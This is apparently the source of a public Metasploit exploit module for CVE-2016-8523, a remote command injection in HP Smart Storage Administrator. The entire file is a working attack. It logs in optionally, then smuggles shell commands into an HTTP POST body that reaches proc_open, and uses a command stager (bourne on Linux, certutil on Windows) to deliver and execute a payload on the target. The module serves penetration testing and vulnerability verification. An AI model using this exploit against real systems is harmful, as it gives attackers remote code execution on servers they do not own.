# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking
 
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "HP Smart Storage Administrator Remote Command Injection",
      &#039;Description&#039;    => %q{
        This module exploits a vulnerability found in HP Smart Storage Administrator. By
        supplying a specially crafted HTTP request, it is possible to control the
        &#039;command&#039; variable in function isDirectFileAccess (found in ipcelmclient.php),
        which will be used in a proc_open() function. Versions prior to HP SSA 2.60.18.0 are vulnerable.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Nicolas Mattiocco (@MaKyOtOx)&#039;  # Discovery & multi-platform Metasploit module
        ],
      &#039;References&#039;     =>
        [
          [&#039;CVE&#039;, &#039;2016-8523&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039; => true
        },
      &#039;Platform&#039;       => %w{ linux win },
      &#039;Targets&#039;        =>
        [
          [&#039;Linux&#039;, {
            &#039;Platform&#039; => &#039;linux&#039;,
            &#039;Arch&#039; => ARCH_X86,
            &#039;CmdStagerFlavor&#039; => &#039;bourne&#039;
          }],
          [&#039;Linux (x64)&#039;, {
            &#039;Platform&#039; => &#039;linux&#039;,
            &#039;Arch&#039; => ARCH_X86_64,
            &#039;CmdStagerFlavor&#039; => &#039;bourne&#039;
          }],
          [&#039;Windows&#039;, {
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Arch&#039; => ARCH_X86,
            &#039;CmdStagerFlavor&#039; => &#039;certutil&#039;
          }],
          [&#039;Windows (x64)&#039;, {
            &#039;Platform&#039; => &#039;win&#039;,
            &#039;Arch&#039; => ARCH_X86_64,
            &#039;CmdStagerFlavor&#039; => &#039;certutil&#039;
          }],
        ],
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Jan 30 2017"
    ))
 
    register_options(
      [
        Opt::RPORT(2381),
        # USERNAME/PASS may not be necessary, because the anonymous access is possible
        OptString.new("USERNAME", [false, &#039;The username to authenticate as&#039;]),
        OptString.new("PASSWORD", [false, &#039;The password to authenticate with&#039;])
      ], self.class)
  end
 
  def check
 
    @cookie = &#039;&#039;
 
    sig = Rex::Text.rand_text_alpha(8)
    cmd = "&echo%20#{sig}&echo"
    res = send_command(cmd, true)
    if not res
      vprint_error("#{peer} - Connection timed out")
      return Exploit::CheckCode::Unknown
    end
 
    if res.code == 200 && res.headers.to_s() =~ /#{sig}/
      return Exploit::CheckCode::Vulnerable
    end
 
    Exploit::CheckCode::Safe
  end
 
 
  def login
    username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]
 
    cookie = &#039;&#039;
 
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => &#039;/proxy/ssllogin&#039;,
      &#039;vars_post&#039; => {
        &#039;redirecturl&#039;         => &#039;&#039;,
        &#039;redirectquerystring&#039; => &#039;&#039;,
        &#039;user&#039;                => username,
        &#039;password&#039;            => password
      }
    })
 
    if not res
      fail_with(Failure::Unknown, "#{peer} - Connection timed out during login")
    end
 
    # CpqElm-Login: success
    if res.headers[&#039;CpqElm-Login&#039;].to_s =~ /success/
      cookie = res.get_cookies.scan(/(Compaq\-HMMD=[\w\-]+)/).flatten[0] || &#039;&#039;
    end
 
    cookie
  end
 
 
  def setup_stager
    execute_cmdstager(:temp => &#039;./&#039;, :linemax => 2800)
  end
 
 
  def execute_command(cmd, opts={})
    res = send_command(cmd, false)
    if res && res.code != 200
      vprint_error("Unexpected response:\n#{res}")
      fail_with(Failure::Unknown, "There was an unexpected response")
    end
  end
 
 
  def send_command(cmd, check)
    if !datastore[&#039;USERNAME&#039;].to_s.empty? && !datastore[&#039;PASSWORD&#039;].to_s.empty? && @cookie.empty?
      @cookie = login
      if @cookie.empty?
        fail_with(Failure::NoAccess, "#{peer} - Login failed")
      else
        print_good("#{peer} - Logged in as &#039;#{datastore[&#039;USERNAME&#039;]}&#039;")
      end
    end
 
    req_opts = {}
 
    # For the check() function, use GET method
    if check
      req_opts[&#039;uri&#039;] = "/HPSSA/index.htm#{cmd}"
      req_opts[&#039;method&#039;] = "GET"
    else
      req_opts[&#039;uri&#039;] = "/HPSSA/index.htm"
      req_opts[&#039;method&#039;] = "POST"
      req_opts[&#039;vars_post&#039;] = {&#039;msf&#039;=>&#039;red&#039;}
      case target.opts[&#039;Platform&#039;]
        when "linux" then req_opts[&#039;data&#039;] = "\" & #{cmd.gsub(/\.\//,"/tmp/")} & echo \""
        when "win"   then req_opts[&#039;data&#039;] = "\" & #{cmd.gsub(/\.\//,"\.\\")} & echo \""
      end
    end
 
    unless @cookie.empty?
      browser_chk = &#039;HPSMH-browser-check=done for this session&#039;
      curl_loc    = "curlocation-#{datastore[&#039;USERNAME&#039;]}="
      req_opts[&#039;cookie&#039;] = "#{@cookie}; #{browser_chk}; #{curl_loc}"
    end
 
    send_request_cgi(req_opts)
  end
 
  def exploit
    @cookie = &#039;&#039;
 
    setup_stager
  end
end

